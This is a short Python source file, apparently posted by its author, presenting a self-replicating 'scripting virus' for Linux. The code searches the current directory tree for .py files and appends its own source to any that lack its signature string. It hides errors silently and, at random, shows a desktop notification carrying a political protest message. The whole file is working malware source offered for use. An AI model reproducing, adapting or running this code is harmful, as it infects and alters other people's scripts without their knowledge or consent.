
# A simple Linux scripting virus
# By Aleksey <hackermaneia@riseup.net>
# - https://github.com/Alekseyyy
# - https://keybase.io/epsiloncalculus

# Magic Signature: 4wtvu93rcq98jub5y8ju9imoewpd3eu95by9ju3k0

import random
import sys
import subprocess
import glob
from contextlib import suppress

def infector(directory):
	def search():
		return glob.glob(directory + "/**/*.py", recursive=True)
	
	def infect(target):
		def infected():
			with open(target, "r") as source:
				if "4wtvu93rcq98jub5y8ju9imoewpd3eu95by9ju3k0" in source.read():
					return True
			return False

		if not infected():
			virus_source = open(sys.argv[0], "r").read()
			target_source = open(target, "r").read()
			with open(target, "w") as target_write:
				target_write.write(target_source + "\n" + virus_source)
	
	for script in search():
		infect(script)
	
def payload():

	title = "Black Lives Matter!"
	message = "An error has occured... in American society. Across the United States, African-Americans and other ethnic minorities are subjected to police violence that sadly ends in fatal encounters. Please acknowledge this and do your best to stand in solidarity with the African-American community in America."
	
	if random.randint(0, 10) > 5:
		subprocess.run(["notify-send", title, message])

def main():
	with suppress(Exception):
		for folder in [".", "~"]:
			infector(folder)
		payload()
	
main()
